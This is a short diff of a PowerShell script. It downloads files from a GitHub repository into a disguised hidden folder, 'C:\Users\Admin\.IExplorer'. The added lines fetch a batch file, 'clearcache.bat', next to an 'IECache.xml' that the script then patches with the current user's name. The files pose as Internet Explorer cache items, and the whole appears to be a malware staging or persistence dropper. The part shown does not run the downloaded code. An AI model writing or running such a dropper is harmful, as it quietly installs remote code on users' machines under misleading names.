@@ -9,6 +9,10 @@ Invoke-WebRequest -Uri $source -OutFile $destination
 $source = 'https://raw.githubusercontent.com/mysec000/tools/main/IECache.xml?raw=true'
 $destination = 'C:\Users\Admin\.IExplorer\IECache.xml'
 Invoke-WebRequest -Uri $source -OutFile $destination
+$source = 'https://raw.githubusercontent.com/mysec000/tools/main/clearcache.bat?raw=true'
+$destination = 'C:\Users\Admin\.IExplorer\clearcache.bat'
+Invoke-WebRequest -Uri $source -OutFile $destination
+
 
 
 (Get-Content C:\Users\Admin\.IExplorer\IECache.xml -Raw) -Replace 'uname', ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Name  | Set-Content C:\Users\Admin\.IExplorer\IECache.xml
